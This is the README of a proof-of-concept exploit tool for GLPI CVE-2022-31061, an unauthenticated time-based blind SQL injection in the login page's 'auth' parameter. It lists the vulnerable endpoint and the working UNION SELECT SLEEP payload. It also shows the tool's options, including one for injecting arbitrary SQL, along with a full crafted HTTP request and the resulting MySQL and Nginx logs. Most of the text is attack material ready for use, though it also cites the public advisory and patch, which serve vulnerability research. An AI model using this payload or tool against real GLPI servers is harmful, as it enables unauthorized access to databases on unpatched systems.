# CVE-2022-31061
PoC for GLPI CVE-2022-31061

A Proof of Concept for GLPI >= 9.3.0 and < 10.0.2 - Unauthenticated SQL injection on login page

## Legal disclaimer : 
Use of this script for attacking à target without mutual consent is illegal. 
It's is the end user responsibility to obey all applicables laws for his location
Developers assume no lisibility and are not responsible for any misuse or domage caused by this program

## Context :
Public disclosure : https://github.com/glpi-project/glpi/security/advisories/GHSA-w2gc-v2gm-q7wq on 2022-06-28

Patch : https://github.com/glpi-project/glpi/releases/tag/10.0.2 on 2022-06-28

Commit : https://github.com/glpi-project/glpi/commit/21ae07d00d0b3230f6235386e98388cfc5bb0514

## Vulnerability : 
- page : POST /front/login.php
- parameter : &auth=ldap-1%27+UNION+SELECT+SLEEP%285%29+%23+
- injection : Blind Time based injection

##Usage 
```
Usage: CVE-2022-31061.py -t https://example.com [-v] [-c cmd]

Options:
  -h, --help            show this help message and exit
  -t TARGET, --target=TARGET
                        GLPI Website to audit
  -v, --verbose         Display verbose output
  -c CMD, --cmd=CMD     payload to inject. Time based Bind Injection. Context
                        : ' SELECT `id` FROM `glpi_users` WHERE `name` =
                        'fzrfdse' AND `authtype` = '3' AND `auths_id` = '1'
                        [payload] # '
  -u USERAGENT, --user-agent=USERAGENT
                        user-agent to use
  -p PROXY, --proxy=PROXY
                        proxy to use
```

## Example :
Command :
```
$ python CVE-2022-31061.py -t http://target
[ 2022-08-07 14:47:35.911449 ] Begin send request for  UNION SELECT SLEEP(5)
[ 2022-08-07 14:47:54.533460 ] End send request for  UNION SELECT SLEEP(5)  Duration :  18.619755
SUCCESS : target is vulnerable
```

Request :
```
POST /front/login.php HTTP/1.1
Host: target
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Referer: http://target/index.php
Cookie: glpi_3f946f74140a3178722cb675d5bf6b47=921opoti2tp4uk3g35sgor5had
Content-Length: 243
Content-Type: application/x-www-form-urlencoded

noAuto=0&redirect=&_glpi_csrf_token=b029a0270351f75ba69cced0385bd77deb548ec0db25eec2c511ee9064ec6bd6&fielda62f008c7f1837=FWVJDCDC&fieldb62f008c7f1838=U6XGS34JKQPC1LD6&auth=ldap-1%27+UNION+SELECT+SLEEP%285%29+%23+&fieldc62f008c7f1839=on&submit=
```

MySQL Logs :
```
SELECT `id` FROM `glpi_users` WHERE `name` = 'FWVJDCDC' AND `authtype` = '3' AND `auths_id` = '1' UNION SELECT SLEEP(5) # '
```

Nginx logs :
```
tester - - [07/Aug/2022:20:47:35 +0200] "GET /index.php HTTP/1.1" 200 3173 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
tester - - [07/Aug/2022:20:47:54 +0200] "POST /front/login.php HTTP/1.1" 200 9232 "http://target/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
```
